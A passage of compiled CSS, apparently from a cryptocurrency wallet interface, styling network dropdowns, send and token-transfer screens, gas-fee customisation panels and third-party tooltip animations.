      .dropdown-menu-item .menu-icon-circle--active {
      margin: 0 14px; }
      .network-indicator {
      display: flex;
      align-items: center;
      font-size: 0.6em; }
      .network-indicator__down-arrow {
      height: 8px;
      width: 12px;
      display: block;
      background-image: url(/images/icons/caret-down.svg);
      background-repeat: no-repeat;
      background-size: contain;
      background-position: center;
      margin: 0 8px; }
      .network-indicator .fa-question-circle {
      margin: 0 4px 0 6px;
      font-size: 1rem;
      flex: 0 0 auto; }
      .network-name {
      padding: 0 4px;
      font-size: 12px;
      line-height: 14px;
      flex: 1 1 auto;
      color: #4d4d4d;
      font-weight: 500;
      white-space: nowrap;
      text-overflow: ellipsis;
      overflow: hidden; }
      .dropdown-menu-item .fa.delete {
      margin-right: 10px;
      display: none; }
      .dropdown-menu-item:hover .fa.delete {
      display: inherit; }
      .network-droppo {
      right: 2px; }
      @media screen and (min-width: 576px) {
      .network-droppo {
      right: calc(((100% - 85vw) / 2) + 2px); } }
      @media screen and (min-width: 769px) {
      .network-droppo {
      right: calc(((100% - 80vw) / 2) + 2px); } }
      @media screen and (min-width: 1281px) {
      .network-droppo {
      right: calc(((100% - 65vw) / 2) + 2px); } }
      .network-name-item {
      flex: 1;
      color: #9b9b9b;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap; }
      .network-check,
      .network-check__transparent {
      color: #fff;
      margin-left: 7px; }
      .network-check__transparent {
      opacity: 0;
      width: 16px;
      margin: 0; }
      .menu-icon-circle,
      .menu-icon-circle--active {
      background: none;
      border-radius: 22px;
      display: flex;
      justify-content: center;
      align-items: center;
      border: 1px solid transparent;
      margin: 0 4px; }
      .menu-icon-circle--active {
      border: 1px solid #fff;
      background: rgba(100, 100, 100, 0.4); }
      .menu-icon-circle div,
      .menu-icon-circle--active div {
      height: 12px;
      width: 12px;
      border-radius: 17px; }
      .menu-icon-circle--active div {
      opacity: 1; }
      .network-dropdown-header {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%; }
      .network-dropdown-divider {
      width: 100%;
      height: 1px;
      margin: 10px 0;
      background-color: #5d5d5d; }
      .network-dropdown-title {
      height: 25px;
      width: 120px;
      color: #fff;
      font-size: 18px;
      line-height: 25px;
      text-align: center; }
      .network-dropdown-content {
      min-height: 36px;
      width: 265px;
      color: #9b9b9b;
      font-size: 14px;
      line-height: 18px; }
      .network-caret {
      margin: 0 8px; }
      .network-loading-spinner {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      position: relative;
      height: 16px;
      width: 16px;
      margin-left: 5px; }
      .network-loading-spinner img {
      height: 26px;
      position: absolute;
      top: -5px;
      left: -6px; }
      /*
      NewUI Container Elements
      */
      .app {
      display: flex;
      flex-direction: column;
      height: 100%;
      overflow-x: hidden;
      position: relative;
      align-items: center; }
      .main-container {
      z-index: 18; }
      .main-container::-webkit-scrollbar {
      display: none; }
      .main-container-wrapper {
      display: flex;
      justify-content: center;
      flex: 1 0 auto;
      min-height: 0;
      width: 100%; }
      @media screen and (min-width: 576px) {
      .lap-visible {
      display: flex; }
      .phone-visible {
      display: none; }
      .main-container {
      width: 85vw;
      margin-bottom: 10vh;
      min-height: 90vh;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08); } }
      @media screen and (min-width: 769px) {
      .main-container {
      width: 80vw;
      min-height: 82vh;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08); } }
      @media screen and (min-width: 1281px) {
      .main-container {
      width: 62vw;
      min-height: 82vh;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08); } }
      @media screen and (max-width: 575px) {
      .lap-visible {
      display: none; }
      .phone-visible {
      display: flex; }
      .main-container {
      width: 100%;
      overflow-y: auto;
      background-color: #fff; }
      .main-container-wrapper {
      flex: 1; } }
      .fiat-amount {
      text-transform: uppercase; }
      .token-balance__amount {
      padding: 0 6px; }
      .first-view-main {
      display: flex;
      flex-direction: row-reverse;
      justify-content: space-between; }
      @media screen and (max-width: 575px) {
      .first-view-main {
      height: 100%; } }
      @media screen and (min-width: 576px) {
      .first-view-main {
      width: 85vw; } }
      @media screen and (min-width: 769px) {
      .first-view-main {
      width: 80vw; } }
      @media screen and (min-width: 1281px) {
      .first-view-main {
      width: 62vw; } }
      .unlock-screen-container {
      z-index: 18;
      display: flex;
      justify-content: center;
      align-items: center;
      flex: 1 0 auto;
      background: #f7f7f7;
      width: 100%; }
      .unlock-screen {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      flex: 1 0 auto; }
      .first-view-main-wrapper {
      display: flex;
      width: 100%;
      height: 100%;
      justify-content: center;
      padding: 0 10px;
      background: white; }
      .send-screen-wrapper {
      display: flex;
      flex-flow: column nowrap;
      z-index: 25; }
      @media screen and (max-width: 575px) {
      .send-screen-wrapper {
      width: 100%;
      overflow-y: auto; } }
      .send-screen-wrapper section {
      flex: 0 0 auto; }
      .send-screen-card {
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      padding: 46px 40.5px 26px;
      position: relative;
      align-items: center;
      display: flex;
      flex-flow: column nowrap;
      width: 498px;
      flex: 1 0 auto; }
      @media screen and (max-width: 575px) {
      .send-screen-card {
      top: 0;
      width: 100%;
      box-shadow: none;
      padding: 12px; } }
      /* Send Screen */
      .send-screen section {
      margin: 4px 16px; }
      .send-screen input {
      width: 100%;
      font-size: 12px; }
      .send-eth-icon {
      border-radius: 50%;
      width: 70px;
      height: 70px;
      border: 1px solid #dedede;
      box-shadow: 0 0 4px 0 rgba(0, 0, 0, 0.2);
      position: absolute;
      top: -35px;
      z-index: 25;
      padding: 4px;
      background-color: #fff; }
      @media screen and (max-width: 575px) {
      .send-eth-icon {
      position: relative;
      top: 0; } }
      .send-screen-input-wrapper {
      width: 95%;
      position: relative; }
      .send-screen-input-wrapper .fa-bolt {
      padding-right: 4px; }
      .send-screen-input-wrapper .large-input {
      border: 1px solid #9b9b9b;
      border-radius: 4px;
      margin: 4px 0 20px;
      font-size: 16px;
      line-height: 22.4px; }
      .send-screen-input-wrapper .send-screen-gas-input {
      border: 1px solid transparent; }
      .send-screen-input-wrapper__error-message {
      display: none; }
      .send-screen-input-wrapper--error input,
      .send-screen-input-wrapper--error .send-screen-gas-input {
      border-color: #f00 !important; }
      .send-screen-input-wrapper--error .send-screen-input-wrapper__error-message {
      display: block;
      position: absolute;
      bottom: 4px;
      font-size: 12px;
      line-height: 12px;
      left: 8px;
      color: #f00; }
      .send-screen-input-wrapper .send-screen-input-wrapper__error-message {
      display: block;
      position: absolute;
      bottom: 4px;
      font-size: 12px;
      line-height: 12px;
      left: 8px;
      color: #f00; }
      .send-screen-input {
      width: 100%; }
      .send-screen-gas-input {
      width: 100%;
      height: 41px;
      border-radius: 3px;
      background-color: #f3f3f3;
      border-width: 0;
      border-style: none;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-left: 10px;
      padding-right: 12px;
      font-size: 16px;
      color: #5d5d5d; }
      .send-screen-amount-labels {
      display: flex;
      flex-direction: row;
      justify-content: space-between; }
      .send-screen-gas-labels {
      display: flex;
      flex-direction: row;
      justify-content: space-between; }
      .currency-toggle__item {
      color: #037dd6;
      cursor: pointer; }
      .currency-toggle__item--selected {
      color: #000;
      cursor: default; }
      .send-screen-gas-input-customize {
      color: #037dd6;
      font-size: 12px;
      cursor: pointer; }
      .gas-tooltip-close-area {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1000;
      width: 100%;
      height: 100%; }
      .customize-gas-tooltip-container {
      position: absolute;
      bottom: 50px;
      width: 237px;
      height: 307px;
      background-color: #fff;
      opacity: 1;
      box-shadow: #dedede 0 0 5px;
      z-index: 1050;
      padding: 13px 19px;
      font-size: 16px;
      border-radius: 4px;
      font-weight: 500; }
      .gas-tooltip-arrow {
      height: 25px;
      width: 25px;
      z-index: 1200;
      background: #fff;
      position: absolute;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      left: 107px;
      top: 294px;
      box-shadow: 2px 2px 2px #dedede; }
      .customize-gas-tooltip-container input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .customize-gas-tooltip-container input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .customize-gas-tooltip {
      position: relative; }
      .gas-tooltip {
      display: flex;
      justify-content: center; }
      .gas-tooltip-label {
      font-size: 16px;
      color: #4d4d4d; }
      .gas-tooltip-header {
      padding-bottom: 12px; }
      .gas-tooltip-input-label {
      margin-bottom: 5px; }
      .gas-tooltip-input-label i {
      color: #aeaeae;
      margin-left: 6px; }
      .customize-gas-input {
      width: 178px;
      height: 28px;
      border: 1px solid #dedede;
      font-size: 16px;
      color: #1b344d;
      padding-left: 8px; }
      .customize-gas-input-wrapper {
      position: relative; }
      .gas-tooltip-input-detail {
      position: absolute;
      top: 4px;
      right: 26px;
      font-size: 12px;
      color: #aeaeae; }
      .gas-tooltip-input-arrows {
      position: absolute;
      top: 0;
      right: 4px;
      width: 17px;
      height: 28px;
      border: 1px solid #dadada;
      border-left: 0;
      display: flex;
      flex-direction: column;
      color: #9b9b9b;
      font-size: 0.8em;
      padding: 1px 4px;
      cursor: pointer; }
      .token-gas__amount {
      display: inline-block;
      margin-right: 4px; }
      .token-gas__symbol {
      display: inline-block; }
      .send-screen__title {
      color: #5d5d5d;
      font-size: 18px;
      line-height: 29px; }
      .send-screen__subtitle {
      margin: 10px 0 20px;
      font-size: 14px;
      line-height: 24px; }
      .send-screen__send-button, .send-screen__cancel-button {
      width: 163px;
      text-align: center; }
      .send-screen__send-button__disabled {
      opacity: 0.5;
      cursor: auto; }
      .send-token {
      display: flex;
      flex-flow: column nowrap;
      z-index: 25; }
      .send-token__content {
      width: 498px;
      height: 605px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      padding: 46px 40.5px 26px;
      position: relative;
      align-items: center;
      display: flex;
      flex-flow: column nowrap;
      flex: 1 0 auto; }
      @media screen and (max-width: 575px) {
      .send-token__content {
      top: 0;
      width: 100%;
      box-shadow: none;
      padding: 12px; } }
      .send-token .identicon {
      position: absolute;
      top: -35px;
      z-index: 25; }
      @media screen and (max-width: 575px) {
      .send-token .identicon {
      position: relative;
      top: 0;
      flex: 0 0 auto; } }
      .send-token__title {
      color: #5d5d5d;
      font-size: 18px;
      line-height: 29px; }
      .send-token__description, .send-token__balance-text, .send-token__token-symbol {
      margin-top: 10px;
      font-size: 14px;
      line-height: 24px;
      text-align: center; }
      .send-token__token-balance {
      font-size: 40px;
      line-height: 40px;
      margin-top: 13px; }
      .send-token__token-balance .token-balance__amount {
      padding-right: 12px; }
      .send-token__button-group {
      display: flex;
      flex-flow: column nowrap;
      align-items: center;
      flex: 0 0 auto; }
      @media screen and (max-width: 575px) {
      .send-token__button-group {
      margin-top: 24px; } }
      .send-token__button-group button {
      width: 163px; }
      .confirm-send-token__hero-amount-wrapper {
      width: 100%; }
      .send-v2__container {
      width: 380px;
      border-radius: 8px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      display: flex;
      flex-flow: column nowrap;
      z-index: 25;
      align-items: center;
      position: relative; }
      @media screen and (max-width: 575px) {
      .send-v2__container {
      width: 100%;
      top: 0;
      box-shadow: none;
      flex: 1 1 auto; } }
      .send-v2__send-header-icon-container {
      z-index: 25; }
      @media screen and (max-width: 575px) {
      .send-v2__send-header-icon-container {
      position: relative;
      top: 0; } }
      .send-v2__send-header-icon {
      border-radius: 50%;
      width: 48px;
      height: 48px;
      border: 1px solid #dedede;
      z-index: 25;
      padding: 4px;
      background-color: #fff; }
      .send-v2__send-arrow-icon {
      color: #f28930;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg);
      position: absolute;
      top: -2px;
      left: 0;
      font-size: 1.12em; }
      .send-v2__arrow-background {
      background-color: #fff;
      height: 14px;
      width: 14px;
      position: absolute;
      top: 52px;
      left: 199px;
      border-radius: 50%;
      z-index: 100; }
      @media screen and (max-width: 575px) {
      .send-v2__arrow-background {
      top: 36px; } }
      .send-v2__header {
      height: 88px;
      width: 380px;
      background-color: #e9edf0;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center; }
      @media screen and (max-width: 575px) {
      .send-v2__header {
      height: 59px;
      width: 100vw; } }
      .send-v2__header-tip {
      height: 25px;
      width: 25px;
      background: #e9edf0;
      position: absolute;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      left: 178px;
      top: 75px; }
      @media screen and (max-width: 575px) {
      .send-v2__header-tip {
      top: 46px;
      left: 0;
      right: 0;
      margin: 0 auto; } }
      .send-v2__title {
      color: #5d5d5d;
      font-size: 22px;
      line-height: 29px;
      text-align: center;
      margin-top: 25px; }
      .send-v2__copy {
      color: #808080;
      font-size: 14px;
      line-height: 19px;
      text-align: center;
      margin-top: 10px;
      width: 287px; }
      .send-v2__error {
      font-size: 12px;
      line-height: 12px;
      left: 8px;
      color: #f00; }
      .send-v2__error-amount {
      margin-top: 5px; }
      .send-v2__warning {
      font-size: 12px;
      line-height: 12px;
      left: 8px;
      color: #ffa500; }
      .send-v2__error-border {
      color: #f00; }
      @media screen and (max-width: 575px) {
      .send-v2__form {
      margin: 0;
      flex: 1 1 auto; } }
      .send-v2__form-header, .send-v2__form-header-copy {
      width: 100%;
      display: flex;
      flex-flow: column;
      align-items: center; }
      .send-v2__form-row {
      margin: 1rem 1rem 0;
      position: relative;
      display: flex;
      flex-flow: row;
      flex: 1 0 auto;
      justify-content: space-between; }
      .send-v2__form-field-container {
      display: flex;
      flex-direction: column;
      width: 277px; }
      .send-v2__form-field {
      flex: 1 1 auto;
      min-width: 0; }
      .send-v2__form-field .currency-display {
      color: #4d4d4d; }
      .send-v2__form-field .currency-display__currency-symbol {
      color: #4d4d4d; }
      .send-v2__form-field .currency-display__converted-value, .send-v2__form-field .currency-display__converted-currency {
      color: #4d4d4d; }
      .send-v2__form-field .account-list-item__account-secondary-balance {
      color: #4d4d4d; }
      .send-v2__form-label {
      color: #5d5d5d;
      font-size: 16px;
      line-height: 22px;
      width: 95px;
      font-weight: 400;
      flex: 0 0 auto; }
      .send-v2__from-dropdown, .send-v2__asset-dropdown {
      width: 100%;
      border: 1px solid #dedede;
      border-radius: 4px;
      background-color: #fff;
      line-height: 16px;
      font-size: 12px;
      color: #4d4d4d;
      position: relative; }
      .send-v2__from-dropdown__close-area, .send-v2__asset-dropdown__close-area {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1000;
      width: 100%;
      height: 100%; }
      .send-v2__from-dropdown__list, .send-v2__asset-dropdown__list {
      z-index: 1050;
      position: absolute;
      height: 220px;
      width: 100%;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.11);
      margin-top: 11px;
      margin-left: -1px;
      overflow-y: scroll; }
      .send-v2__from-dropdown {
      height: 73px; }
      .send-v2__asset-dropdown {
      height: 54px;
      border: none; }
      .send-v2__asset-dropdown__single-asset {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      padding: 8px 8px; }
      .send-v2__asset-dropdown__single-asset:hover {
      background-color: rgba(222, 222, 222, 0.2); }
      .send-v2__asset-dropdown__asset {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      padding: 0 8px;
      cursor: pointer; }
      .send-v2__asset-dropdown__asset:hover {
      background-color: rgba(222, 222, 222, 0.2); }
      .send-v2__asset-dropdown__asset-icon .identicon {
      border: 1px solid #dedede; }
      .send-v2__asset-dropdown__asset-data {
      display: flex;
      flex-flow: column nowrap;
      margin-left: 8px;
      flex-grow: 1; }
      .send-v2__asset-dropdown__symbol {
      font-size: 16px;
      margin-bottom: 2px; }
      .send-v2__asset-dropdown__name {
      display: flex;
      flex-flow: row nowrap;
      font-size: 12px; }
      .send-v2__asset-dropdown__name__label {
      margin-right: 0.25rem; }
      .send-v2__asset-dropdown__close-area {
      z-index: 2000; }
      .send-v2__asset-dropdown__list {
      z-index: 2050;
      position: absolute;
      height: 220px;
      width: 100%;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.11);
      top: 65px;
      left: 0;
      box-sizing: content-box;
      overflow-y: scroll;
      margin-top: 0;
      padding: 4px 0; }
      .send-v2__asset-dropdown__list .send-v2__asset-dropdown__asset {
      padding: 8px; }
      .send-v2__asset-dropdown__input-wrapper {
      border: 1px solid #dedede;
      border-radius: 4px;
      height: 100%; }
      .send-v2__asset-dropdown__input-wrapper--opened {
      position: relative;
      z-index: 2050; }
      .send-v2__asset-dropdown__input-wrapper .send-v2__asset-dropdown__asset {
      height: 100%; }
      .send-v2__asset-dropdown__input-wrapper .send-v2__asset-dropdown__asset:hover {
      background-color: #fff; }
      .send-v2__asset-dropdown__input {
      z-index: 1025;
      position: relative;
      height: 54px;
      width: 100%;
      border: none;
      border-radius: 4px;
      background-color: #fff;
      color: #4d4d4d;
      padding: 10px;
      font-size: 16px;
      line-height: 21px; }
      .send-v2__memo-text-area__input, .send-v2__hex-data__input {
      z-index: 1025;
      position: relative;
      height: 54px;
      width: 100%;
      border: 1px solid #dedede;
      border-radius: 4px;
      background-color: #fff;
      color: #4d4d4d;
      padding: 10px;
      font-size: 16px;
      line-height: 21px; }
      .send-v2__amount-max {
      font-size: 12px;
      position: relative;
      display: inline-block;
      width: 56px;
      height: 20px;
      margin-top: 5px; }
      .send-v2__amount-max__button {
      width: 56px;
      height: 20px;
      position: absolute;
      border: 2px solid #b0d7f2;
      border-radius: 6px;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #2f9ae0; }
      .send-v2__amount-max__button__disabled {
      color: #b0d7f2;
      cursor: auto; }
      input:checked + .send-v2__amount-max__button {
      background-color: #037dd6;
      border: 2px solid #037dd6;
      color: #fff; }
      .send-v2__amount-max input {
      opacity: 0;
      width: 0;
      height: 0; }
      .send-v2__gas-fee-display {
      width: 100%;
      position: relative; }
      .send-v2__gas-fee-display .currency-display--message {
      padding: 8px 38px 8px 10px;
      display: flex;
      align-items: center; }
      .send-v2__sliders-icon-container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 24px;
      width: 24px;
      border: 1px solid #037dd6;
      border-radius: 4px;
      background-color: #fff;
      position: absolute;
      right: 15px;
      top: 14px;
      cursor: pointer;
      font-size: 1em; }
      .send-v2__sliders-icon {
      color: #037dd6; }
      .send-v2__memo-text-area__input {
      padding: 6px 10px; }
      .send-v2__footer {
      height: 92px;
      width: 100%;
      display: flex;
      justify-content: space-evenly;
      align-items: center;
      border-top: 1px solid #dedede;
      background: #fff;
      padding: 0 12px;
      flex-shrink: 0; }
      .send-v2__next-btn, .send-v2__cancel-btn {
      width: 163px;
      margin: 0 4px; }
      .send-v2__customize-gas {
      border: 1px solid #d8d8d8;
      border-radius: 4px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.14);
      display: flex;
      flex-flow: column; }
      @media screen and (max-width: 575px) {
      .send-v2__customize-gas {
      width: 100vw;
      height: 100vh; } }
      .send-v2__customize-gas__header {
      height: 52px;
      border-bottom: 1px solid #dedede;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 22px; }
      @media screen and (max-width: 575px) {
      .send-v2__customize-gas__header {
      flex: 0 0 auto; } }
      .send-v2__customize-gas__title {
      margin-left: 19.25px; }
      .send-v2__customize-gas__close::after {
      content: '\00D7';
      font-size: 1.8em;
      color: #9b9b9b;
      cursor: pointer;
      margin-right: 19.25px; }
      .send-v2__customize-gas__content {
      display: flex;
      flex-flow: column nowrap;
      height: 100%; }
      .send-v2__customize-gas__body {
      display: flex;
      margin-bottom: 24px; }
      @media screen and (max-width: 575px) {
      .send-v2__customize-gas__body {
      flex-flow: column;
      flex: 1 1 auto; } }
      .send-v2__customize-gas__footer {
      height: 75px;
      border-top: 1px solid #dedede;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 22px;
      position: relative; }
      @media screen and (max-width: 575px) {
      .send-v2__customize-gas__footer {
      flex: 0 0 auto; } }
      .send-v2__customize-gas__buttons {
      display: flex;
      justify-content: space-between;
      margin-right: 21.25px; }
      .send-v2__customize-gas__revert, .send-v2__customize-gas__cancel, .send-v2__customize-gas__save, .send-v2__customize-gas__save__error {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0 3px;
      cursor: pointer; }
      .send-v2__customize-gas__revert {
      color: #aeaeae;
      font-size: 16px;
      margin-left: 21.25px; }
      .send-v2__customize-gas__cancel, .send-v2__customize-gas__save, .send-v2__customize-gas__save__error {
      width: 85.74px;
      min-width: initial; }
      .send-v2__customize-gas__save__error {
      opacity: 0.5;
      cursor: auto; }
      .send-v2__customize-gas__error-message {
      display: block;
      position: absolute;
      top: -18px;
      right: 0;
      font-size: 12px;
      line-height: 12px;
      color: #f00;
      width: 100%;
      text-align: center; }
      .send-v2__customize-gas__cancel {
      margin-right: 10px; }
      .send-v2__gas-modal-card {
      width: 360px;
      display: flex;
      flex-flow: column;
      align-items: flex-start;
      padding-left: 20px; }
      .send-v2__gas-modal-card__title {
      height: 26px;
      color: #4d4d4d;
      font-size: 20px;
      line-height: 26px;
      margin-top: 17px; }
      .send-v2__gas-modal-card__copy {
      height: 38px;
      width: 314px;
      color: #4d4d4d;
      font-size: 14px;
      line-height: 19px;
      margin-top: 17px; }
      .send-v2__gas-modal-card .customize-gas-input-wrapper {
      margin-top: 17px; }
      .send-v2__gas-modal-card .customize-gas-input {
      height: 54px;
      width: 315px;
      border: 1px solid #d2d8dd;
      background-color: #fff;
      padding-left: 15px; }
      .send-v2__gas-modal-card .gas-tooltip-input-arrows {
      width: 32px;
      height: 54px;
      border-left: 1px solid #dadada;
      font-size: 18px;
      color: #4d4d4d;
      right: 0;
      padding: 0;
      display: flex;
      justify-content: space-around;
      align-items: center; }
      .send-v2__gas-modal-card .gas-tooltip-input-arrow-wrapper {
      align-items: center;
      align-self: stretch;
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      justify-content: center; }
      .send-v2__gas-modal-card input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .send-v2__gas-modal-card input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .advanced-gas-options-btn {
      display: flex;
      justify-content: flex-end;
      font-size: 14px;
      color: #2f9ae0;
      cursor: pointer;
      margin-top: 5px; }
      .sliders-icon-container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 24px;
      width: 24px;
      border: 1px solid #037dd6;
      border-radius: 4px;
      background-color: #fff;
      position: absolute;
      right: 15px;
      top: 14px;
      cursor: pointer;
      font-size: 1em; }
      .gas-fee-reset {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 24px;
      border-radius: 4px;
      background-color: #fff;
      position: absolute;
      right: 12px;
      top: 14px;
      cursor: pointer;
      font-size: 1em;
      font-size: 14px;
      color: #2f9ae0; }
      .sliders-icon {
      color: #037dd6; }
      .simple-dropdown {
      height: 56px;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      border: 1px solid #dedede;
      border-radius: 4px;
      background-color: #fff;
      font-size: 16px;
      color: #4d4d4d;
      cursor: pointer;
      position: relative; }
      .simple-dropdown__caret {
      color: #cdcdcd;
      padding: 0 10px; }
      .simple-dropdown__selected {
      flex-grow: 1;
      padding: 0 15px; }
      .simple-dropdown__options {
      z-index: 1050;
      position: absolute;
      height: 220px;
      width: 100%;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.11);
      margin-top: 10px;
      overflow-y: scroll;
      left: 0;
      top: 100%; }
      .simple-dropdown__option {
      padding: 10px; }
      .simple-dropdown__option:hover {
      background-color: #efefef; }
      .simple-dropdown__option--selected {
      background-color: #dedede; }
      .simple-dropdown__option--selected:hover {
      background-color: #dedede;
      cursor: default; }
      .simple-dropdown__close-area {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1000;
      width: 100%;
      height: 100%; }
      /*
      Third Party Library Styles
      */
      .tippy-touch {
      cursor: pointer !important; }
      .tippy-notransition {
      transition: none !important; }
      .tippy-popper {
      max-width: 400px;
      -webkit-perspective: 800px;
      perspective: 800px;
      z-index: 9999;
      outline: 0;
      transition-timing-function: cubic-bezier(0.165, 0.84, 0.44, 1);
      pointer-events: none; }
      .tippy-popper.html-template {
      max-width: 96%;
      max-width: calc(100% - 20px); }
      .tippy-popper[x-placement^=top] [x-arrow] {
      border-top: 7px solid #333;
      border-right: 7px solid transparent;
      border-left: 7px solid transparent;
      bottom: -7px;
      margin: 0 9px; }
      .tippy-popper[x-placement^=top] [x-arrow].arrow-small {
      border-top: 5px solid #333;
      border-right: 5px solid transparent;
      border-left: 5px solid transparent;
      bottom: -5px; }
      .tippy-popper[x-placement^=top] [x-arrow].arrow-big {
      border-top: 10px solid #333;
      border-right: 10px solid transparent;
      border-left: 10px solid transparent;
      bottom: -10px; }
      .tippy-popper[x-placement^=top] [x-circle] {
      -webkit-transform-origin: 0 33%;
      transform-origin: 0 33%; }
      .tippy-popper[x-placement^=top] [x-circle].enter {
      -webkit-transform: scale(1) translate(-50%, -55%);
      transform: scale(1) translate(-50%, -55%);
      opacity: 1; }
      .tippy-popper[x-placement^=top] [x-circle].leave {
      -webkit-transform: scale(0.15) translate(-50%, -50%);
      transform: scale(0.15) translate(-50%, -50%);
      opacity: 0; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.light-theme [x-circle] {
      background-color: #fff; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.light-theme [x-arrow] {
      border-top: 7px solid #fff;
      border-right: 7px solid transparent;
      border-left: 7px solid transparent; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.light-theme [x-arrow].arrow-small {
      border-top: 5px solid #fff;
      border-right: 5px solid transparent;
      border-left: 5px solid transparent; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.light-theme [x-arrow].arrow-big {
      border-top: 10px solid #fff;
      border-right: 10px solid transparent;
      border-left: 10px solid transparent; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.transparent-theme [x-circle] {
      background-color: rgba(0, 0, 0, 0.7); }
      .tippy-popper[x-placement^=top] .tippy-tooltip.transparent-theme [x-arrow] {
      border-top: 7px solid rgba(0, 0, 0, 0.7);
      border-right: 7px solid transparent;
      border-left: 7px solid transparent; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.transparent-theme [x-arrow].arrow-small {
      border-top: 5px solid rgba(0, 0, 0, 0.7);
      border-right: 5px solid transparent;
      border-left: 5px solid transparent; }
      .tippy-popper[x-placement^=top] .tippy-tooltip.transparent-theme [x-arrow].arrow-big {
      border-top: 10px solid rgba(0, 0, 0, 0.7);
      border-right: 10px solid transparent;
      border-left: 10px solid transparent; }
      .tippy-popper[x-placement^=top] [data-animation=perspective] {
      -webkit-transform-origin: bottom;
      transform-origin: bottom; }
      .tippy-popper[x-placement^=top] [data-animation=perspective].enter {
      opacity: 1;
      -webkit-transform: translateY(-10px) rotateX(0);
      transform: translateY(-10px) rotateX(0); }
      .tippy-popper[x-placement^=top] [data-animation=perspective].leave {
      opacity: 0;
      -webkit-transform: translateY(0) rotateX(90deg);
      transform: translateY(0) rotateX(90deg); }
      .tippy-popper[x-placement^=top] [data-animation=fade].enter {
      opacity: 1;
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px); }
      .tippy-popper[x-placement^=top] [data-animation=fade].leave {
      opacity: 0;
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px); }
      .tippy-popper[x-placement^=top] [data-animation=shift].enter {
      opacity: 1;
      -webkit-transform: translateY(-10px);
      transform: translateY(-10px); }
      .tippy-popper[x-placement^=top] [data-animation=shift].leave {
      opacity: 0;
      -webkit-transform: translateY(0);
      transform: translateY(0); }
      .tippy-popper[x-placement^=top] [data-animation=scale].enter {
      opacity: 1;
      -webkit-transform: translateY(-10px) scale(1);
      transform: translateY(-10px) scale(1); }
      .tippy-popper[x-placement^=top] [data-animation=scale].leave {
      opacity: 0;
      -webkit-transform: translateY(0) scale(0);
      transform: translateY(0) scale(0); }
      .tippy-popper[x-placement^=bottom] [x-arrow] {
      border-bottom: 7px solid #333;
      border-right: 7px solid transparent;
      border-left: 7px solid transparent;
      top: -7px;
      margin: 0 9px; }
      .tippy-popper[x-placement^=bottom] [x-arrow].arrow-small {
      border-bottom: 5px solid #333;
      border-right: 5px solid transparent;
      border-left: 5px solid transparent;
      top: -5px; }
      .tippy-popper[x-placement^=bottom] [x-arrow].arrow-big {
      border-bottom: 10px solid #333;
      border-right: 10px solid transparent;
      border-left: 10px solid transparent;
      top: -10px; }
      .tippy-popper[x-placement^=bottom] [x-circle] {
      -webkit-transform-origin: 0 -50%;
      transform-origin: 0 -50%; }
      .tippy-popper[x-placement^=bottom] [x-circle].enter {
      -webkit-transform: scale(1) translate(-50%, -45%);
      transform: scale(1) translate(-50%, -45%);
      opacity: 1; }
      .tippy-popper[x-placement^=bottom] [x-circle].leave {
      -webkit-transform: scale(0.15) translate(-50%, -5%);
      transform: scale(0.15) translate(-50%, -5%);
      opacity: 0; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.light-theme [x-circle] {
      background-color: #fff; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.light-theme [x-arrow] {
      border-bottom: 7px solid #fff;
      border-right: 7px solid transparent;
      border-left: 7px solid transparent; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip.light-theme [x-arrow].arrow-small {
      border-bottom: 5px solid #fff;
